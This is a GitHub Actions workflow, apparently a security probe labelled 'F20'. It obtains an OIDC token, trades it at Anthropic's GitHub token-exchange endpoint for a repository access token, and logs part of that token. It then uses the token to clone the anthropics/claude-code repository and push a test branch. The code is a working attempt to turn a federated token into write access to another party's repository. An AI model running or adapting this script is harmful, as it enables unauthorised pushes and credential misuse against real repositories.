name: OIDC Token Test
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Git Push Test
        uses: actions/github-script@v7
        with:
          script: |
            const token = await core.getIDToken('claude-code-github-action');
            const resp = await fetch('https://api.anthropic.com/api/github/github-app-token-exchange', {
              method: 'POST',
              headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' }
            });
            const data = await resp.json();
            const T = data.token;
            if (!T) { console.log('Token exchange failed:', JSON.stringify(data)); return; }
            console.log('Token:', T.substring(0,20)+'...');
            
            // Write token to file for next step
            const fs = require('fs');
            fs.writeFileSync('/tmp/ghtoken', T);

      - name: Git Push via HTTPS transport
        run: |
          TOKEN=$(cat /tmp/ghtoken)
          git clone https://x-access-token:${TOKEN}@github.com/anthropics/claude-code.git /tmp/cc
          cd /tmp/cc
          git config user.email "test@test.com"
          git config user.name "test"
          git checkout -b security-test-f20-push-$(date +%s)
          echo "security test $(date)" >> README.md
          git add README.md
          git commit -m "security test F20 - git push via HTTPS"
          git push origin HEAD
          echo "PUSH STATUS: $?"
